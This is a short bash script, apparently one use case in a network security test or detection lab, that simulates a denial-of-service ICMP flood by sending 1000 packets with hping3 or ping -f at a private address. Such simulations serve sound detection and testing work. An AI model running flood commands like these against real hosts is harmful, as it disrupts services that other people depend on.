#!/bin/bash
echo "[*] UC09: Simulating DoS (ICMP Flood)..."
# Sending 1000 packets quickly
sudo hping3 -1 --flood -c 1000 172.30.20.10 || ping -f -c 1000 172.30.20.10
